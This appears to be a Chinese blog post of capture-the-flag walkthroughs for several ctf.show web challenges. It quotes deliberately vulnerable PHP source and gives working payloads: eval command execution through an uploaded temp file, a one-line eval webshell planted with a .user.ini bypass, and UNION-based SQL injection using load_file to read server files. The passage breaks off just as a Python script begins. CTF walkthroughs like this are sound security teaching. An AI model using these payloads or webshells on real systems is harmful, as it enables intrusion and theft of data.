<p>?cmd=highlight_file(“index.php”); 或 ?cmd=show_source(“index.php”);</p>
<p>显示了源码：</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-CN&quot;</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html; charset=UTF-8&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0&quot;</span> /&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>ctf.show_web12<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">center</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>ctf.show_web12<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="tag">&lt;<span class="name">h4</span>&gt;</span>where is the flag?<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span></span><br><span class="line"><span class="xml">    <span class="comment">&lt;!-- hit:?cmd= --&gt;</span></span></span><br><span class="line"><span class="xml">    </span><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">        <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span></span><br><span class="line"><span class="php">        <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">            <span class="meta">?&gt;</span></span><span class="xml"></span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span></span><br><span class="line"><span class="xml"></span></span><br></pre></td></tr></table></figure>

<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">cmd</span><span class="bash">=print_r(glob(<span class="string">&#x27;*&#x27;</span>)); 或：</span></span><br><span class="line">?<span class="keyword">cmd</span><span class="bash">=print_r(scandir(<span class="string">&#x27;.&#x27;</span>));</span></span><br><span class="line">打印目录下文件，有两个文件，输出内容即可</span><br><span class="line"></span><br><span class="line">?<span class="keyword">cmd</span><span class="bash">=highlight_file(<span class="string">&quot;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php&quot;</span>);</span></span><br></pre></td></tr></table></figure>

<h2 id="web红包第二弹"><a href="#web红包第二弹" class="headerlink" title="web红包第二弹"></a>web红包第二弹</h2><p>查看网页源代码后发现：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hit:?cmd= --&gt;</span></span><br></pre></td></tr></table></figure>

<p>随便传入参数后，出现源代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;cerror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(preg_match(<span class="string">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;serror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">     <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>此段代码要求cmd不能含有除了p以外的大小写字母和数字，且不能含有特殊字符：$~!@#%^&amp;等等。可以使用的有：p ` ? / + &lt; &gt; =</p>
<p>构造文件上传，<img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403144141565.png" alt="image-20220403144141565"></p>
<p>上传1.txt，内容为</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line"></span><br><span class="line">ls /</span><br></pre></td></tr></table></figure>

<p>构造payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">  通过可用的字符构造cmd=<span class="meta">?&gt;</span><span class="meta">&lt;?=</span>`.+/??p/p?p??????`，由<span class="keyword">eval</span>（<span class="variable">$cmd</span>）来运行临时文件</span><br><span class="line"> <span class="meta">?&gt;</span>闭合前面 </span><br><span class="line">解释构造原理：<span class="meta">&lt;?=</span> <span class="variable">$cmd</span> <span class="meta">?&gt;</span> 等于 <span class="meta">&lt;?php</span> <span class="keyword">echo</span>(<span class="variable">$cmd</span>) <span class="meta">?&gt;</span></span><br><span class="line">在php中，<span class="meta">&lt;?</span> <span class="meta">?&gt;</span>称为短标签，<span class="meta">&lt;?php</span> <span class="meta">?&gt;</span>称为长标签。修改PHP.ini文件配置 short_open_tag = On 才可使用短标签。php5.<span class="number">4.0</span>以后， <span class="meta">&lt;?=</span> 总是可代替 <span class="meta">&lt;?</span> <span class="keyword">echo</span>。</span><br><span class="line"> 在php中反引号的作用是命令替换，将其中的字符串当成shell命令执行，返回命令的执行结果。反引号包括的字符串必须是能执行的shell命令，否则会出错。</span><br><span class="line"></span><br><span class="line">点 .</span><br><span class="line">点命令等于source命令，用来执行文件。</span><br><span class="line">source /home/user/bash   等同于   . /home/user/bash</span><br><span class="line">+：空格</span><br><span class="line">/??p/p?p??????</span><br><span class="line">临时文件夹目录，默认是/tmp目录， 默认为 php+<span class="number">4</span>或者<span class="number">6</span>位随机数字和大小写字母，在windows下有tmp后缀，linux没有。</span><br><span class="line">windows下：phpXXXXXX.tmp  linux下：phpXXXXXX</span><br></pre></td></tr></table></figure>

<p>上传文件</p>
<p>​    用burpsuite发送POST请求，上传文件。<img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403144513418.png" alt="image-20220403144513418"></p>
<p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403144433732.png" alt="image-20220403144433732"></p>
<p>以上请求头修改了3个地方：</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1</span><br><span class="line"> </span><br><span class="line">Content-<span class="keyword">Type</span>: multipart/<span class="keyword">form</span>-data; boundary=---------------------------10242300956292313528205888</span><br><span class="line"> </span><br><span class="line">-----------------------------10242300956292313528205888</span><br><span class="line">Content-Disposition: <span class="keyword">form</span>-data; name=<span class="string">&quot;fileUpload&quot;</span>; filename=<span class="string">&quot;1.txt&quot;</span></span><br><span class="line">Content-<span class="keyword">Type</span>: text/plain</span><br><span class="line"> </span><br><span class="line">#! /bin/<span class="keyword">sh</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">cat</span> /flag.txt</span><br><span class="line">-----------------------------10242300956292313528205888--</span><br><span class="line"></span><br><span class="line">Content-<span class="keyword">Type</span>有两个值：</span><br><span class="line">①application/x-www-<span class="keyword">form</span>-urlencoded(默认值) ：上传键值对</span><br><span class="line">②multipart/<span class="keyword">form</span>-data：上传文件</span><br><span class="line"></span><br><span class="line">boundary为边界分隔符</span><br><span class="line">文件开始标记：-----------------------------10242300956292313528205888</span><br><span class="line">文件结束标记：-----------------------------10242300956292313528205888--</span><br><span class="line">其中10242300956292313528205888是浏览器随机生成的，只要足够复杂就可以。</span><br><span class="line"></span><br><span class="line">   #! /bin/<span class="keyword">sh</span> 指定命令解释器，#!是一个特殊的表示符，其后，跟着解释此脚本的<span class="keyword">shell</span>路径。bash只是<span class="keyword">shell</span>的一种，还有很多其它<span class="keyword">shell</span>，如：<span class="keyword">sh</span>,csh,ksh,tcsh。首先用命令<span class="keyword">ls</span> /  来查看服务器根目录有哪些文件，发现有flag.txt，然后再用<span class="keyword">cat</span> /flag.txt 即可。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><p>常见的源码泄露<br> .hg源码泄漏 .git源码泄漏 .DS_Store文件泄漏，还有以.php.bak结尾的网页,.phps等</p>
<p>输入upload.php.bak 下载源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	header(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	<span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$temp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">	<span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">	<span class="variable">$error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">	<span class="variable">$arr</span> = pathinfo(<span class="variable">$filename</span>);</span><br><span class="line">	<span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$size</span> &gt; <span class="number">24</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error file zise&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (strlen(<span class="variable">$filename</span>)&gt;<span class="number">9</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(strlen(<span class="variable">$ext_suffix</span>)&gt;<span class="number">3</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$ext_suffix</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/php/i&quot;</span>),<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_name</span>, <span class="string">&#x27;./&#x27;</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们发现了上传文件的要求，文件的大小要小于等于24，名字长度小于等于9，后缀长度小于等于3，并且最要命的是后缀和名字都不能包含php。我们肯定是要上传一句话木马的，既然小于等于24可以这样写&lt;?php eval($_GET[‘a’]);正好24字节可以满足，但是由于后缀问题服务器无法解析该php语句。这里用一种特殊的手法来绕过。<br>1.我们先将一句话保存为a.txt。<br>2.上传a.txt<br>3上传.user.ini文件。<br>对于php中的.user.ini有如下解释：<br>PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。也就是在.user.ini中如果设置了文件名，那么任意一个页面都会将该文件中的内容包含进去。<br>我们在.user.ini中输入auto_prepend_file =a.txt，这样在该目录下的所有文件都会包含a.txt的内容<br>4.蚁剑连接<br> 连接不上，所以我们直接在网页上查找flag。<br> <code>a=print_r(glob(&quot;*&quot;));</code></p>
<p>接着输入 <code>a=highlight_file(&quot;903c00105c0141fd37ff47697e916e53616e33a72fb3774ab213b3e2a732f56f.php &quot;);</code></p>
<p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403152209581.png" alt="image-20220403152209581"></p>
<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403161536068.png" alt="image-20220403161536068"></p>
<p> case 44444:<br>      echo ‘@A@’;没有break</p>
<p> case 3:<br>      echo ‘@A@’;<br>    case 6000000:<br>      echo “$url”;也没有break</p>
<p>如果不加break会一直执行下去，直到结束或者遇到break</p>
<p>在这个题目中有一条限制 <code>sleep($c);</code>就是我们输入的c是多少就会等待多少秒然后执行。所以我们想要输出$url就得找到一个小的case。我们可以看到下图中的c=3显然满足。case 3 后面没有break会接着执行下面的<code>echo &quot;$url&quot;</code></p>
<p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403161806446.png" alt="image-20220403161806446"></p>
<p>成功显示 here_1s_your_f1ag.php，接下来访问该页面。是一个很明显的注入页面，但还不确定能否注入。</p>
<p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403161937347.png" alt="image-20220403161937347"></p>
<p>if(preg_match(’/information_schema.tables|information_schema.columns|linestring| |polygon/is’, $_GET[‘query’])){undefined<br>die(’@A@’);<br>}<br>过滤的关键词有information_schema.tables，information_schema.columns，linestring，空格，polygon。</p>
<p>在这里提供一种绕过的方法——反引号<br>反引号：它是为了区分MYSQL的保留字与普通字符而引入的符号。<br>例如</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema.<span class="keyword">tables</span>和information_schema.`<span class="keyword">tables</span>`</span><br></pre></td></tr></table></figure>

<p>都可以使用。<br>网页的弹窗使得我们不容易观察，我们直接在源代码页面进行注入。<br>例如这样</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:<span class="regexp">//</span><span class="number">124.156</span>.<span class="number">121.112</span>:<span class="number">28051</span><span class="regexp">/here_1s_your_f1ag.php?query=1/</span>**<span class="regexp">/order/</span>**<span class="regexp">/by/</span>**/<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>当输入order by 1时才不显示错误，所以有一个回显位置。<br>接下来使用联合注入。</p>
<p>爆库名(web)</p>
<pre><code>?query=-1/**/union/**/select/**/database()
</code></pre>
<p>爆表名(content)</p>
<pre><code>?query=-1/**/union/**/select/**/group_concat(table_name)/**/from/**/information_schema.`tables`/**/where/**/table_schema=database()
</code></pre>
<p>爆字段名(id,username,password)</p>
<pre><code>?query=-1/**/union/**/select/**/group_concat(column_name)/**/from/**/information_schema.`columns`/**/where/**/table_name=&#39;content&#39;
</code></pre>
<p>爆值</p>
<pre><code>?query=-1/**/union/**/select/**/group_concat(id,username,password)/**/from/**/content
</code></pre>
<p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403162544863.png" alt="image-20220403162544863"><br>到这我们发现数据库中并没有我们想要的flag，但是有一条提示tell you a secret,secert has a secret… 所以很有可能flag在secret.php中，现在就有一个问题，我们怎么从数据库中查看文件内容呢，mysql提供了读取本地文件的函数load_file()<br>所以我们构造语句：</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?query=-<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span>load<span class="constructor">_file(&#x27;<span class="operator">/</span><span class="params">var</span><span class="operator">/</span><span class="params">www</span><span class="operator">/</span><span class="params">html</span><span class="operator">/</span><span class="params">secret</span>.<span class="params">php</span>&#x27;)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/31/CTF%E5%A4%A7%E8%B5%9B%E5%8E%9F%E9%A2%98/image-20220403162829419.png" alt="image-20220403162829419"></p>
<p>也就是如果/tmp/gtf1y中的内容为ctf.show则输出/real_flag_is_here中的值，所以我们直接将/real_flag_is_here读取即可得到flag。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?query=-<span class="number">1</span><span class="regexp">/**/u</span>nion<span class="regexp">/**/</span>select<span class="regexp">/**/</span>load_file(<span class="string">&#x27;/real_flag_is_here&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="ctfshow-web1"><a href="#ctfshow-web1" class="headerlink" title="ctfshow web1"></a>ctfshow web1</h2><p>提示：flag在指定用户的密码中。</p>
<p><a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 下载源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">login.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">		error_reporting(<span class="number">0</span>);</span><br><span class="line">		session_start();</span><br><span class="line">		<span class="variable">$con</span> = mysqli_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;web15&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">&quot;/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\=|\]|\;|\&#x27;|\’|\“|\&quot;|\&lt;|\&gt;|\?/i&quot;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$sql</span>=<span class="string">&quot;select pwd from user where uname = &#x27;<span class="subst">$username</span>&#x27; limit 1&quot;</span>;</span><br><span class="line">			<span class="variable">$res</span>=mysqli_query(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line">			<span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$res</span>);</span><br><span class="line">			<span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pwd&#x27;</span>]===<span class="variable">$password</span>)&#123;</span><br><span class="line">				<span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>] = <span class="literal">true</span>;</span><br><span class="line">				header(<span class="string">&quot;location:/user_main.php?order=id&quot;</span>);</span><br><span class="line">			&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">				header(<span class="string">&quot;location:/index.php&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			header(<span class="string">&quot;location:/index.php&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>打开login.php能禁的基本都禁干净了，登录页面貌似没有注入的可能。reg.php也是如此，所以注册页面也没可能了。剩下最后一个就是显示信息的页面了。这里可以看到在数据库中是把所有的字段（包括密码）都给查出来了，但是没有显示密码的地方。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&quot;login&quot;</span>] === <span class="literal">true</span>)&#123;</span><br><span class="line">		<span class="variable">$con</span> = mysqli_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;web15&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line">		<span class="variable">$order</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;order&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$order</span>) &amp;&amp; strlen(<span class="variable">$order</span>)&lt;<span class="number">6</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>(preg_match(<span class="string">&quot;/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\&#123;|\&#125;|\[|\]|\;|\:|\&#x27;|\’|\“|\&quot;|\&lt;|\&gt;|\?|\,|\.|\?/i&quot;</span>,<span class="variable">$order</span>))&#123;</span><br><span class="line">				<span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$sql</span>=<span class="string">&quot;select * from user order by <span class="subst">$order</span>&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$sql</span>=<span class="string">&quot;select * from user order by id&quot;</span>;</span><br><span class="line">        &#125;   </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">     &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?=</span><span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?=</span><span class="variable">$row</span>[<span class="string">&#x27;uname&#x27;</span>];<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?=</span><span class="variable">$row</span>[<span class="string">&#x27;email&#x27;</span>];<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;<span class="meta">&lt;?=</span><span class="variable">$row</span>[<span class="string">&#x27;nname&#x27;</span>];<span class="meta">?&gt;</span>&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br></pre></td></tr></table></figure>

<p>我们可以利用?order=pwd来判断注册的密码与flag用户密码的大小（即 select * from user order by pwd;），当我们按照pwd排序时，比如 flag用户的密码为flag{123}，我们从小到大 一直到f都在他的上面，当我们注册的密码为g时，则出现第一个在下面的<br>顺序大致是这样，这时我们就可以判断密码的第一个字符为f，手工的话会比较麻烦，这里献上python脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 